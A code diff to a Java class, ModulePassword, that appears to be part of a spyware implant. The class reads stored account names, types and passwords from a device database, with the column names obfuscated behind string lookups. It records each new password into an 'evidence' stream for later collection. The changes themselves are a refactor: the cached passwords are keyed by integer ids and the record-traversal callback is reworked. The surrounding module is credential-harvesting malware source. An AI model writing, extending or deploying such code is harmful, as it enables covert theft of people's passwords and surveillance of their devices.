@@ -30,7 +30,7 @@ public class ModulePassword extends BaseModule {
 	private static final String TAG = "ModulePassword"; //$NON-NLS-1$
 	private static final int ELEM_DELIMITER = 0xABADC0DE;
 	private Markup markupPassword;
-	private HashMap<String, String> lastPasswords;
+	private HashMap<Integer, String> lastPasswords;
 	private static HashMap<String, Integer> services = new HashMap<String, Integer>();
 
 	@Override
@@ -61,7 +61,7 @@ public class ModulePassword extends BaseModule {
 		setDelay(200);
 
 		markupPassword = new Markup(this);
-		lastPasswords = markupPassword.unserialize(new HashMap<String, String>());
+		lastPasswords = markupPassword.unserialize(new HashMap<Integer, String>());
 	}
 
 	@Override
@@ -80,8 +80,8 @@ public class ModulePassword extends BaseModule {
 			}
 
 			@Override
-			public void cursor(Cursor cursor) {
-				String jid = cursor.getString(0);
+			public int cursor(Cursor cursor) {
+				int jid = cursor.getInt(0);
 				String name = cursor.getString(1);
 				String type = cursor.getString(2);
 				String password = cursor.getString(3);
@@ -97,9 +97,9 @@ public class ModulePassword extends BaseModule {
 				if (!StringUtils.isEmpty(password)) {
 
 					if (lastPasswords.containsKey(jid) && lastPasswords.get(jid).equals(value)) {
-						return;
+						return jid;
 					} else {
-						lastPasswords.put(jid, value);
+						lastPasswords.put( jid, value);
 						needToSerialize = true;
 					}
 
@@ -110,6 +110,8 @@ public class ModulePassword extends BaseModule {
 					evidence.write(ByteArray.intToByteArray(ELEM_DELIMITER));
 
 				}
+				
+				return jid;
 			}
 		};
 
@@ -147,8 +149,9 @@ public class ModulePassword extends BaseModule {
 		// h_8=password
 		String[] projection = { Messages.getString("h_5"), Messages.getString("h_6"), Messages.getString("h_7"),
 				Messages.getString("h_8") };
+		visitor.projection = projection;
 
-		helper.traverseRecords(table, projection, visitor);
+		helper.traverseRecords(table, visitor);
 
 	}
 
